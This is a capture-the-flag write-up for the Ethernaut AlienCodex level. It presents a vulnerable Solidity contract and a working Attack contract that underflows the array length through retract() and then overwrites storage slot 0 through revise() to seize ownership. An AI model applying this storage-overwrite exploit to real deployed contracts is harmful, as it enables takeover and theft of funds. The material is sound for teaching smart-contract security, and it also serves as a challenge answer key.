## Challenge
~~~
You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
`

## Solution

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

contract Attack {
    AlienCodex private  _target = AlienCodex(0x0BC04aa6aaC163A6B3667636D798FA053D43BD11);
    uint256 public firstElementSlot;
    uint256 public zeroSlotElementIndex;
    bytes32 public content;

    function calc() external {
        firstElementSlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        zeroSlotElementIndex = 0 - firstElementSlot;
        content = bytes32(uint256(uint160(msg.sender)));
    }

    function attack() external {
        _target.revise(zeroSlotElementIndex, content);
    }
}
```

Before we call the `attack()` function of our `Attack` contract, we need to call the `retract()` function of the vulnerable contract. In previous solidity version `arr.length--` was a way to pop a value out of the array (now deprecated). Since the array is of size 0 this would make the size of the array = 2^256 - 1 and since it elements are of size 32 bytes, all storage slots would be used by the array and we can modify the values of all storage slots.
## Key takeaways and useful resources

[State variables in storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)

